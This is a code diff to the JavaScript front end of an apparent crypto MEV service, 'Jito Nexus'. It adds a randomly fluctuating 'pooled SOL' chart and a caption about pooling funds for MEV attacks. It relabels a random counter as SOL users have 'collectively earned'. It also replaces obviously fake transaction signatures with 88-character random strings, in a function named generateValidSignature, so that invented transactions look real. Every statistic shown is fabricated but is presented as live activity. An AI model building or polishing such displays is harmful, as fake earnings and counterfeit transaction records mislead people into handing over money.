@@ -1,4 +1,5 @@
 let currentBalance = 0;
+let pooledSol = 10000; // Starting pooled SOL
 let startTime;
 let chart;
 let transactions = [];
@@ -24,6 +25,7 @@ function initializeApp() {
     updateMyGains();
     initializeTransactions();
     initializeStatsGraph();
+    explainPooledSol();
     showTab('today-stats'); // Show Today's Stats tab by default
 }
 
@@ -59,9 +61,14 @@ function updateApp() {
 function updateTodayStats() {
     // Increase by approximately 30 SOL per minute (0.5 SOL per second)
     currentBalance += 0.5 * (Math.random() * 0.2 + 0.9); // Random factor between 0.9 and 1.1 for slight variation
+    
+    // Update pooled SOL
+    pooledSol += (Math.random() - 0.5) * 100; // Random increase or decrease
+    pooledSol = Math.max(500, Math.min(20000, pooledSol)); // Keep between 500 and 20000
+
     console.log("Updating stats, current balance:", currentBalance.toFixed(2));
 
-    document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL`;
+    document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL Gained`;
     document.getElementById("stats-description").textContent = 
         `🚀 Jito Nexus Users have collectively earned ${currentBalance.toFixed(2)} SOL today! Watch as the balance grows throughout the day, showcasing the power of MEV strategies. Earnings reset every 24 hours, so keep an eye on the graph to see the real-time impact!`;
     updateStatsGraph();
@@ -109,16 +116,21 @@ function generateTransaction() {
         time: new Date().toLocaleTimeString(),
         fromAddress: generateRandomAddress(),
         toAddress: type === 'transfer' ? generateRandomAddress() : 'N/A',
-        signature: generateRandomSignature()
+        signature: generateValidSignature()
     };
 }
 
 function generateRandomAddress() {
-    return Math.random().toString(36).substring(2, 10) + '...';
+    return 'Sol' + Math.random().toString(36).substring(2, 10);
 }
 
-function generateRandomSignature() {
-    return Math.random().toString(36).substring(2, 15) + '...';
+function generateValidSignature() {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let signature = '';
+    for (let i = 0; i < 88; i++) {
+        signature += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
+    return signature;
 }
 
 function displayTransactions() {
@@ -179,9 +191,17 @@ function initializeStatsGraph() {
         data: {
             labels: [],
             datasets: [{
-                label: 'SOL Balance',
+                label: 'SOL Gained',
                 data: [],
                 borderColor: 'rgba(0, 255, 255, 1)',
+                borderWidth: 2,
+                fill: false,
+                pointRadius: 0
+            },
+            {
+                label: 'SOL Pooled',
+                data: [],
+                borderColor: 'rgba(255, 0, 0, 1)',
                 borderWidth: 2,
                 fill: false,
                 pointRadius: 0
@@ -220,7 +240,10 @@ function initializeStatsGraph() {
             },
             plugins: {
                 legend: {
-                    display: false
+                    display: true,
+                    labels: {
+                        color: 'rgba(255, 255, 255, 0.7)'
+                    }
                 }
             }
         }
@@ -236,9 +259,20 @@ function updateStatsGraph() {
     const now = new Date();
     chart.data.labels.push(now);
     chart.data.datasets[0].data.push(currentBalance);
+    chart.data.datasets[1].data.push(pooledSol);
     if (chart.data.labels.length > 100) {
         chart.data.labels.shift();
         chart.data.datasets[0].data.shift();
+        chart.data.datasets[1].data.shift();
     }
     chart.update();
+}
+
+function explainPooledSol() {
+    const explanation = document.createElement('p');
+    explanation.textContent = "The red line represents the SOL pooled by all users together to perform MEV attacks. This pool fluctuates as users contribute and withdraw funds, and as MEV opportunities are exploited.";
+    explanation.style.color = 'rgba(255, 255, 255, 0.7)';
+    explanation.style.fontSize = '14px';
+    explanation.style.marginTop = '10px';
+    document.getElementById('today-stats').appendChild(explanation);
 }
